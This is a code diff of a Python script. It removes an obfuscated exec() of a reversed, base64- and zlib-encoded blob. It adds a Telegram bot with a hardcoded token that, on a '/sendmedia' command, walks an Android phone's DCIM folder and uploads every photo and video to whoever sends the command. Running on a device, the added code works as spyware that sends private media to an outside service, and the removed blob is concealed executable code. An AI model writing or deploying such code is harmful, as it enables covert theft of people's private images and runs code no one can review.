@@ -1,4 +1,106 @@
+import requests
+import time
+import logging
+import os
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+# Replace with your actual Bot Token
+BOT_TOKEN = '7902674854:AAGthUdNsxKk2AvuliFuELlBDpI44bbFGRI'
+BASE_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/'
+
+# Path to DCIM directory
+DCIM_PATH = '/sdcard/DCIM/'
+
+# Enable logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Function to get updates
+def get_updates(offset=None):
+    url = BASE_URL + 'getUpdates'
+    params = {'timeout': 100, 'offset': offset}
+    response = requests.get(url, params=params)
+
+    # Check for HTTP errors
+    if response.status_code != 200:
+        pass
+        return []
+
+    # Check for 'result' in the JSON response
+    try:
+        result_json = response.json()
+        if 'result' in result_json:
+            return result_json['result']
+        else:
+            pass
+            return []
+    except ValueError:
+        pass
+        return []
+
+# Function to send a message
+def send_message(chat_id, text):
+    url = BASE_URL + 'sendMessage'
+    params = {'chat_id': chat_id, 'text': text}
+    requests.get(url, params=params)
+
+# Function to send a file (image or video)
+def send_file(chat_id, file_path):
+    url = BASE_URL + ('sendPhoto' if file_path.lower().endswith(('.jpg', '.jpeg', '.png')) else 'sendVideo')
+    with open(file_path, 'rb') as file:
+        files = {'photo' if file_path.lower().endswith(('.jpg', '.jpeg', '.png')) else 'video': file}
+        params = {'chat_id': chat_id}
+        response = requests.post(url, params=params, files=files)
+        
+        if response.status_code != 200:
+            pass
+
+# Function to scan and send all media files in DCIM folder
+def send_all_media(chat_id):
+    # Traversing through DCIM directory
+    for root, dirs, files in os.walk(DCIM_PATH):
+        for file_name in files:
+            if file_name.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov')):
+                file_path = os.path.join(root, file_name)
+                send_file(chat_id, file_path)
+                time.sleep(1)  # Optional: Delay to avoid API rate limits
+
+# Handler for the /start command
+def handle_start(chat_id):
+    message = 'Welcome! Send /sendmedia to receive all images and videos.'
+    send_message(chat_id, message)
+
+# Handler for the /help command
+def handle_help(chat_id):
+    message = "Commands:\n/start - Welcome message\n/help - List commands\n/sendmedia - Send all images and videos"
+    send_message(chat_id, message)
+
+# Main function to process updates and respond to commands
+def main():
+    offset = None
+    while True:
+        updates = get_updates(offset)
+        for update in updates:
+            # Update the offset to the latest update id + 1
+            offset = update['update_id'] + 1
+
+            if 'message' in update:
+                message = update['message']
+                chat_id = message['chat']['id']
+                text = message.get('text')
+
+                # Handle different commands or text messages
+                if text == '/start':
+                    handle_start(chat_id)
+                elif text == '/help':
+                    handle_help(chat_id)
+                elif text == '/sendmedia':
+                    send_message(chat_id, "Sending all images and videos...")
+                    send_all_media(chat_id)
+        
+        # Short delay to avoid hitting API limits
+        time.sleep(1)
+
+if __name__ == '__main__':
+    main()
